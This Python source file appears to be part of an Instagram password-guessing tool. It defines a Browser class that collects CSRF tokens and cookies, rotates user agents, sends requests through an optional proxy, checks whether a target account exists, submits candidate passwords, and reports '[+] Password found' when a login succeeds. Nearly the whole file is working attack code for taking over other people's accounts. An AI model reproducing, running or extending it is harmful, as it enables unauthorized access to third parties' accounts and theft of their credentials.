from requests_html import HTMLSession
from lib.src.const import session_data, ft, headers, _home, _login_url
from lib.src.user_agent import user_agent
from datetime import datetime
from lib.src.debug.debug import Debug
import sys

class Browser:
	def __init__(self, username = None, password = None, proxy = None, verbose = False):
		self.username = username
		self.password = password
		self.proxy = proxy
		self.__session = None
		self.verbose = verbose
	@property
	def browser(self):
		self.__session = None
		if self.__session is None:
			header = session_data['header']
			header['user-agent'] = user_agent()
			_session = HTMLSession()
			_session.headers.update(header)
			if self.proxy is not None:
				addr = {'http': f'http://{self.proxy}', 'https': f'https://{self.proxy}'}
				_session.proxies.update(addr)
		self.__session = _session
		return self.__session
	def csrftoken(self):
		res = self.browser.get(session_data['login_url'].replace('/ajax', ''), timeout=ft)
		cookies = res.cookies.get_dict()
		mid = cookies["mid"]
		id_did = cookies["ig_did"]
		ig_nrcb = cookies["ig_nrcb"]
		headers['X-CSRFToken'] = cookies['csrftoken']
		headers['Cookie'] = f'mid={mid}; ig_did={id_did}; ig_nrcb={ig_nrcb}; rur="missing"; csrftoken={cookies["csrftoken"]}'
		return {
			'cookie': headers['Cookie'],
			'status': res.status_code
		}
	def post(self):
		try:
			cookies = self.csrftoken()
			Debug(f'[*] Cookies has been setted to {cookies["cookie"]}', verbose=self.verbose)
		except:
			pass
		enc_password = "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(int(datetime.now().timestamp()), self.password)
		data = {
			session_data['username_field']: self.username,
			session_data['password_field']: enc_password
		}
		res = self.browser.post(_login_url, data=data, timeout=ft)
		try:
			return res.json()
		except:
			Debug('[-] ' + str(res.status_code))
	def user_exist(self):
		verboseBool = self.verbose
		res = self.browser.get(session_data['home_url'] + f'{self.username}', timeout=ft)
		if res.status_code == 404:
			Debug("[-] User doesn't exist", verbose=self.verbose)
			sys.exit()
		elif res.status_code == 200:
			Debug('[+] User exists', verbose=verboseBool)
		else:
			Debug(f'[-] Something is wrong, status: {res.status_code}', verbose=self.verbose)
			sys.exit()
		
	def login(self):
		authenticated = False
		error = False
		password = 'None'
		res = self.post()
		if res is not None:
			try:
				if res['authenticated']:
					Debug(f'[+] Password found: {self.password}', verbose=self.verbose)
					Debug(f'[*] Informations: \n  Username: {self.username}, \n  Password: {self.password}', verbose=self.verbose)
					authenticated = True
					password = self.password
				else:
					Debug(f'[-] {self.password} is incorrect', verbose=self.verbose)
					authenticated = False
			except:
				Debug(f'[-] {res["message"]}', verbose=self.verbose)
				error = True
		return {
			'error': error,
			'authenticated': authenticated,
			'passsword': password
		}